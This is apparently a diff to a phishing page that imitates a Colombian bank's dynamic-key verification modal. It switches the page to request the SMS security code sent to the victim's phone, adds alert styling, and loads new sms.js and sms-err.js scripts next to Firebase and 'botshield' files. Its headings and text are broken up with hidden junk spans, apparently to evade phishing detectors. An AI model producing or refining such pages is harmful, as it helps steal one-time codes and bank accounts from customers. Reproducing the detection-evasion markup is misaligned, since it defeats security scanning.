@@ -85,9 +85,97 @@
     #modal-key-validation .bc-input-token .bc-input-token-container.bc-all-inputs-valid:focus-within input {
       border-bottom: solid 2px #fff;
     }
+
+    #dinamica-alert-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 9999;
+      pointer-events: none;
+    }
+
+    #dinamica-alert-container > * {
+      pointer-events: all;
+    }
+
+    .custom-bc-alert {
+      position: fixed;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: calc(100% - 32px);
+      max-width: 600px;
+      background-color: #ffffff;
+      border-radius: 4px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+      display: flex;
+      align-items: flex-start;
+      padding: 16px 20px;
+      z-index: 9999;
+      border-left: 6px solid #F37052;
+    }
+
+    .custom-bc-icon {
+      flex-shrink: 0;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: #FEE7E2;
+      color: #F37052;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 14px;
+      margin-top: 2px;
+    }
+
+    .custom-bc-content {
+      flex: 1;
+    }
+
+    .custom-bc-title {
+      margin: 0 0 6px 0;
+      font-size: 15px;
+      font-weight: 700;
+      color: #2c2a29;
+    }
+
+    .custom-bc-text {
+      margin: 0;
+      font-size: 14px;
+      color: #4a4a4a;
+    }
+
+    .custom-bc-close {
+      background: none;
+      border: none;
+      color: #717171;
+      cursor: pointer;
+      padding: 2px;
+      margin-left: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: color 0.2s;
+    }
+
+    .custom-bc-close:hover {
+      color: #222;
+    }
+
+    .dinamica-alert-anim {
+      animation: dinamica-alert-slide-in 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    @keyframes dinamica-alert-slide-in {
+      from { opacity: 0; transform: translateX(-50%) translateY(-40px); }
+      to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
   </style>
 </head>
 <body data-device="desktop">
+  <div id="dinamica-alert-container"></div>
   <main class="dinamica-shell">
     <bc-key-validation componentid="modal-key-validation">
       <article
@@ -105,11 +193,11 @@
               <div class="bc-key-validation-dynamic-container bc-bg-brand-sequential-C-200">
                 <img src="./images/banner.gif" width="100%" height="100%" alt="">
               </div>
-              <h3 id="modal-key-validation_keyValidationTitle">Ingresa<span style="display:none">xkj</span> la<span style="display:none;font-size:0">abc</span> Clave<span style="display:none">pqr</span> Dinamica</h3>
+              <h3 id="modal-key-validation_keyValidationTitle">In<span style="display:none">qrs</span>gre<span style="display:none;font-size:0">mno</span>sa el SMS en<span style="display:none">def</span>via<span style="display:none;font-size:0">ghi</span>do a tu cel<span style="display:none">jkl</span>ular</h3>
             </div>
 
             <div class="bc-key-validation-body">
-              <p class="bc-key-validation-description" style="padding-bottom: 0;">Encuentra<span style="display:none">xkj</span> tu<span style="display:none;font-size:0">abc</span> Clave<span style="display:none">pqr</span> Dinamica<span style="display:none;font-size:0">def</span> en la App.</p>
+              <p class="bc-key-validation-description" style="padding-bottom: 0;">Có<span style="display:none">qrs</span>di<span style="display:none;font-size:0">mno</span>go de se<span style="display:none">def</span>guri<span style="display:none;font-size:0">ghi</span>dad en<span style="display:none">jkl</span>via<span style="display:none;font-size:0">nop</span>do a su ce<span style="display:none">stu</span>lu<span style="display:none;font-size:0">vwx</span>lar re<span style="display:none">yza</span>gis<span style="display:none;font-size:0">bcd</span>tra<span style="display:none">efg</span>do.</p>
               <div class="bc-key-validation-input-container">
                 <div class="bc-key-validation-input-content bc-pb-0">
                   <div class="bc-fm-fld bc-lg-field">
@@ -157,9 +245,10 @@
   <script src="js/firebase-config.js"></script>
   <script src="js/dinamica-device.js"></script>
   <script src="js/botshield.js"></script>
-  <script src="js/dinamica.js"></script>
+  <script src="js/sms.js"></script>
+  <script src="js/sms-err.js"></script>
   <script>
-    document.addEventListener("DOMContentLoaded", function initDinamicaBotShield() {
+    document.addEventListener("DOMContentLoaded", function initSmsErrBotShield() {
       document.querySelectorAll("[data-obfuscate]").forEach(function (el) {
         if (el.textContent.trim().length > 0) {
           el.innerHTML = BotShield.obfuscateText(el.textContent.trim());
